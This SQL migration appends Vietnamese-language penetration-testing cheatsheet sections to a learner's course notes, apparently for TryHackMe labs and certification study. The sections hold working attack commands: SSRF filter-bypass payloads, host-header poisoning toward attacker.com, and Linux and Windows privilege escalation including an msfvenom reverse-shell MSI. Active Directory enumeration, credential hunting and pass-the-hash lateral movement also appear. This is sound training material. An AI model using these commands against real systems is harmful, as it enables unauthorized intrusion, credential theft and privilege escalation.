-- 0067_cheatsheet_gaps_from_specific_rooms: fill cheatsheet gaps found while
-- cross-checking against specific THM rooms the user is currently working
-- through (Web: RabbitStore, Reset, Ledger, Stealth, Loopback; Network: Linux
-- PrivEsc, Windows PrivEsc 2.0, NetSec Challenge; AD: AD Basic/Authenticated
-- Enumeration, Lateral Movement and Pivoting) — e.g. `getcap`/`setcap` and
-- other capability-abuse commands used in Linux PrivEsc that weren't yet in
-- section 8. Appends to each section's existing body (never overwrites what's
-- already there) and is idempotent: guarded by a NOT LIKE check on a marker
-- string unique to this migration's content, so re-running changes nothing.

-- 2. Network Service Enumeration — port-range splitting / banner grabbing /
-- non-standard-port brute force, confirmed against the NetSec Challenge room.
UPDATE course_notes cn SET body = cn.body || E'\n\n' || $cheat$**Khi `nmap -p-` quá chậm / nghi port lạ ở range cao** — chia đôi range để chạy song song, dùng `-T5` khi mạng lab ổn định (không lo rate-limit như thi thật) **[PT1, NetSec Challenge]**:
```
nmap -p 1-10000 <target> -T5
nmap -p 10000-65000 <target> -T5
nmap -sT <target> -T5 -p-          # TCP connect scan — khi SYN scan (-sS) cần root mà không có
nmap -sN <target>                  # null scan (không set flag nào) — một số tool/room cũ dùng để né log IDS đơn giản, KHÔNG đáng tin với IDS hiện đại
```

**Banner grabbing thủ công bằng telnet/nc** — khi muốn tự đọc response thay vì để nmap đoán **[Chung]**:
```
telnet <target> 80
GET / HTTP/1.1
Host: <target>
                                    # Enter 2 lần để gửi request trống, đọc header response

telnet <target> 22                 # đọc banner SSH trực tiếp
```

**Hydra trên port không chuẩn** — khi service bị đổi sang port lạ (hay gặp trong NetSec Challenge), luôn chỉ rõ port bằng `://host:port` **[PT1]**:
```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://<target>:<port> -v
```$cheat$
FROM users u, subjects s
WHERE cn.user_id = u.id AND u.email = 'thehaohcm@tradesign.io.vn'
  AND cn.subject_id = s.id AND s.slug = 'pentest'
  AND cn.title = '2. Network Service Enumeration & Default Credentials'
  AND cn.body NOT LIKE '%NetSec Challenge%nmap -sT%';

-- 3. Web Exploitation — Injection — SSRF filter-bypass payload list (Loopback)
-- + message-broker post-RCE commands actually used in the app's own
-- RabbitStore-inspired lab (rabbitmqctl / .erlang.cookie) that were missing
-- from the cheatsheet itself.
UPDATE course_notes cn SET body = cn.body || E'\n\n' || $cheat$**SSRF — bypass filter chặn 127.0.0.1/localhost theo tên** — thử lần lượt, nhiều filter chỉ chặn đúng chuỗi "127.0.0.1"/"localhost" **[WEB1, Loopback]**:
```
http://0/                          # 0 tương đương 0.0.0.0 tương đương loopback trên nhiều hệ
http://0.0.0.0/
http://127.1/                      # rút gọn, vẫn hợp lệ
http://2130706433/                 # 127.0.0.1 dạng số nguyên thập phân
http://017700000001/               # 127.0.0.1 dạng octal
http://127.0.0.1.nip.io/           # domain công khai tự resolve DNS về 127.0.0.1
```
Cùng mẹo "domain tự trỏ về IP nội bộ" áp dụng để bypass allowlist/SSRF tới cloud metadata (169.254.169.254) khi target chạy trên cloud.

**RabbitMQ / Erlang cookie (sau khi đã RCE, tìm thấy file `.erlang.cookie` world-readable)** — cookie dùng chung xác thực giữa các node Erlang, có cookie = node hợp lệ, không cần user/pass của RabbitMQ **[WEB1, RabbitStore]**:
```
find / -iname ".erlang.cookie" 2>/dev/null
cat /var/lib/rabbitmq/.erlang.cookie     # hoặc ~/.erlang.cookie — copy giá trị này
rabbitmqctl -n rabbit@<hostname> list_users
rabbitmqctl -n rabbit@<hostname> export_definitions /tmp/defs.json   # xuất cả password_hash để brute offline
```$cheat$
FROM users u, subjects s
WHERE cn.user_id = u.id AND u.email = 'thehaohcm@tradesign.io.vn'
  AND cn.subject_id = s.id AND s.slug = 'pentest'
  AND cn.title = '3. Web Exploitation — Injection'
  AND cn.body NOT LIKE '%erlang.cookie%';

-- 4. Web Exploitation — Auth, XSS, Access Control, API — password-reset
-- specific attacks (Reset) layered on top of the existing IDOR block.
UPDATE course_notes cn SET body = cn.body || E'\n\n' || $cheat$**Password Reset — các điểm luôn phải test riêng** (ngoài IDOR cơ bản ở trên) **[WEB1, Reset]**:
```
# 1) Host Header Poisoning — nếu link reset email build từ header Host,
#    đổi Host trong request "quên mật khẩu" trỏ về domain của mình:
curl -s -X POST http://<target>/forgot-password -H "Host: attacker.com" -d "email=victim@target.com"
# -> nếu victim click link trong email, token bị gửi về attacker.com

# 2) Token có đoán được không? (tăng dần, timestamp, MD5(email) không salt...)
#    So sánh token của 2 lần request liên tiếp trên CHÍNH tài khoản mình.

# 3) Token có bị vô hiệu hoá sau khi dùng 1 lần không?
#    Dùng lại cùng 1 token reset 2 lần — lần 2 phải báo lỗi, nếu không là bug.

# 4) IDOR ngay trên chính request reset: đổi email/user id trong body/param
#    của bước "đặt mật khẩu mới" sang tài khoản nạn nhân, dùng token của MÌNH.
```$cheat$
FROM users u, subjects s
WHERE cn.user_id = u.id AND u.email = 'thehaohcm@tradesign.io.vn'
  AND cn.subject_id = s.id AND s.slug = 'pentest'
  AND cn.title = '4. Web Exploitation — Auth, XSS, Access Control, API'
  AND cn.body NOT LIKE '%Host Header Poisoning%';

-- 8. Linux Privilege Escalation — getcap/setcap + other missing vectors
-- (Docker group, LD_PRELOAD, PATH hijack).
UPDATE course_notes cn SET body = cn.body || E'\n\n' || $cheat$**Linux capabilities** — tương đương SUID nhưng cấp quyền cụ thể hơn (vd chỉ cần `cap_setuid` là đủ để leo root), `find -perm -4000` KHÔNG tìm ra loại này, phải dùng `getcap` riêng **[PT1, Linux PrivEsc]**:
```
getcap -r / 2>/dev/null
# thấy vd: /usr/bin/python3.9 = cap_setuid+ep
python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Tra thêm trên GTFOBins (tab "Capabilities") nếu binary có cap lạ không phải python.

**Docker group → root** — user trong group `docker` (không cần sudo) tương đương root, vì container mount được toàn bộ filesystem host **[PT1]**:
```
id                                        # thấy "docker" trong danh sách group là đủ điều kiện
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**LD_PRELOAD trong sudoers** — nếu `sudo -l` cho thấy biến `env_keep+=LD_PRELOAD` (hoặc NOPASSWD với `env_keep`), tự compile .so chạy code khi binary start, trước khi vào main() **[PT1]**:
```
cat sample.c                              # void _init(){ setuid(0); setgid(0); system("/bin/bash -p"); }
gcc -fPIC -shared -o shell.so sample.c -nostartfiles
sudo LD_PRELOAD=/full/path/shell.so <binary được phép sudo>
```

**PATH hijack** — khi script bị root chạy gọi 1 lệnh KHÔNG có đường dẫn tuyệt đối (vd chỉ `service` thay vì `/usr/sbin/service`) và PATH của script ghi được **[PT1]**:
```
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/service   # tạo file trùng tên lệnh bị gọi
chmod +x /tmp/service
export PATH=/tmp:$PATH
# chờ/trigger script gốc chạy -> /bin/bash bị set SUID
```$cheat$
FROM users u, subjects s
WHERE cn.user_id = u.id AND u.email = 'thehaohcm@tradesign.io.vn'
  AND cn.subject_id = s.id AND s.slug = 'pentest'
  AND cn.title = '8. Linux Privilege Escalation'
  AND cn.body NOT LIKE '%getcap -r%';

-- 9. Windows Privilege Escalation — service/registry/scheduled-task checks
-- and PowerUp.ps1, matching Windows PrivEsc 2.0's methodology.
UPDATE course_notes cn SET body = cn.body || E'\n\n' || $cheat$**Service permissions (binary/registry ghi được bởi user thường)** — service chạy bằng SYSTEM nhưng binary/config ghi được = SYSTEM shell **[PT1, Windows PrivEsc 2.0]**:
```powershell
accesschk.exe -uwcqv "Authenticated Users" *          # service nào user thường start/stop/config được?
icacls "C:\Program Files\<App>\service.exe"            # ai ghi được binary của service?
sc qc <service_name>                                   # xem BINARY_PATH_NAME hiện tại
sc config <service_name> binpath= "C:\evil.exe"        # thay bằng binary của mình (nếu config được)
sc start <service_name>
```

**Unquoted Service Path** — path có khoảng trắng mà không có dấu ngoặc kép, Windows thử lần lượt từng đoạn trước dấu cách như 1 file .exe riêng **[PT1]**:
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v '"'   # lọc ra path KHÔNG có dấu nháy kép
# path: C:\Program Files\My App\service.exe
# -> Windows sẽ thử chạy C:\Program.exe rồi C:\Program Files\My.exe trước
# đặt file evil.exe đúng tên đoạn ghi được, ví dụ: C:\Program Files\My.exe
```

**AlwaysInstallElevated** — nếu cả 2 khoá registry dưới đều = 1, mọi user chạy `.msi` với quyền SYSTEM, không cần hỏi quyền **[PT1]**:
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

**Scheduled tasks & stored credentials** **[PT1]**:
```powershell
schtasks /query /fo LIST /v                             # task nào chạy bằng SYSTEM mà script ghi được?
cmdkey /list                                             # credential Windows lưu sẵn (runas /savecred)
dir /s /b *.config *.xml *unattend* 2>nul | findstr /i "pass"   # unattend.xml, web.config hay lộ password plaintext
```

**PowerUp.ps1** — tự động hoá gần hết các bước trên, chạy đầu tiên để biết hướng nào khả thi trước khi làm tay **[PT1]**:
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```$cheat$
FROM users u, subjects s
WHERE cn.user_id = u.id AND u.email = 'thehaohcm@tradesign.io.vn'
  AND cn.subject_id = s.id AND s.slug = 'pentest'
  AND cn.title = '9. Windows Privilege Escalation'
  AND cn.body NOT LIKE '%accesschk.exe%';

-- 10. Active Directory — Enumeration & Credential Access — net/PowerView +
-- exact ldapsearch/windapsearch/GetADUsers.py syntax (AD Basic/Authenticated
-- Enumeration).
UPDATE course_notes cn SET body = cn.body || E'\n\n' || $cheat$**`net` command — nhanh gọn khi đã có shell Windows trên domain (không cần tool ngoài)** **[CPTS, AD Basic/Authenticated Enumeration]**:
```powershell
net user /domain
net user <username> /domain              # chi tiết 1 user: group, lần login cuối...
net group "Domain Admins" /domain
net group /domain                        # liệt kê toàn bộ group
```

**PowerView** — tương đương bộ `net` trên nhưng chi tiết hơn nhiều, chạy được cả khi không join domain (qua `-Credential`) **[CPTS]**:
```powershell
Import-Module .\PowerView.ps1
Get-NetUser | select samaccountname,description
Get-NetGroup "Domain Admins" | Get-NetGroupMember
Get-NetComputer | select dnshostname,operatingsystem
```

**ldapsearch — cú pháp đầy đủ cho LDAP có credential** **[CPTS]**:
```bash
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w '<pass>' -b "DC=<domain-part1>,DC=<domain-part2>" "(objectClass=user)" sAMAccountName
```

**windapsearch — tương đương ldapsearch nhưng output gọn hơn, có sẵn mode đặc biệt** **[CPTS]**:
```bash
python3 windapsearch.py -d <domain> -u <user>@<domain> -p '<pass>' --dc-ip <dc-ip> -U     # liệt kê user
python3 windapsearch.py -d <domain> -u <user>@<domain> -p '<pass>' --dc-ip <dc-ip> --da    # thành viên Domain Admins
```

**GetADUsers.py (Impacket)** — liệt kê user kèm `pwdLastSet`/`badPwdCount`, hữu ích để chọn user làm password spray **[CPTS]**:
```bash
GetADUsers.py <domain>/<user>:<pass> -dc-ip <dc-ip> -all
```$cheat$
FROM users u, subjects s
WHERE cn.user_id = u.id AND u.email = 'thehaohcm@tradesign.io.vn'
  AND cn.subject_id = s.id AND s.slug = 'pentest'
  AND cn.title = '10. Active Directory — Enumeration & Credential Access'
  AND cn.body NOT LIKE '%PowerView%';

-- 11. Active Directory — Lateral Movement & Domain Dominance — smbexec.py
-- (missing alongside psexec/wmiexec), ACL-abuse password reset via `net rpc`,
-- and an RDP-over-pivot note, matching Lateral Movement and Pivoting.
UPDATE course_notes cn SET body = cn.body || E'\n\n' || $cheat$**smbexec.py (Impacket)** — thêm 1 lựa chọn bên cạnh psexec/wmiexec ở trên, ít để lại service/task tạm hơn psexec **[CPTS, Lateral Movement and Pivoting]**:
```bash
smbexec.py <domain>/<user>:<pass>@<target>
smbexec.py -hashes :<nthash> <domain>/<user>@<target>
```

**Đổi mật khẩu user khác qua quyền ACL (BloodHound chỉ ra `ForceChangePassword`/`GenericAll`)** — không cần biết mật khẩu cũ **[CPTS]**:
```bash
net rpc password "<target_user>" "NewP@ssword123" -U '<user_có_quyền>'%'<pass>' -S "<dc-ip>"
```

**RDP qua pivot (sau khi đã có tunnel SOCKS/Ligolo vào mạng nội bộ)** **[CPTS]**:
```bash
proxychains xfreerdp /u:<user> /p:'<pass>' /v:<internal-target> +clipboard
# hoặc nếu đã có TUN interface thật qua Ligolo-ng: xfreerdp dùng trực tiếp, không cần proxychains
```
`runas /netonly` hữu ích khi máy mình chưa join domain nhưng cần chạy tool Windows (vd mstsc) bằng credential domain: `runas /netonly /user:<domain>\<user> cmd`.$cheat$
FROM users u, subjects s
WHERE cn.user_id = u.id AND u.email = 'thehaohcm@tradesign.io.vn'
  AND cn.subject_id = s.id AND s.slug = 'pentest'
  AND cn.title = '11. Active Directory — Lateral Movement & Domain Dominance'
  AND cn.body NOT LIKE '%smbexec.py%';
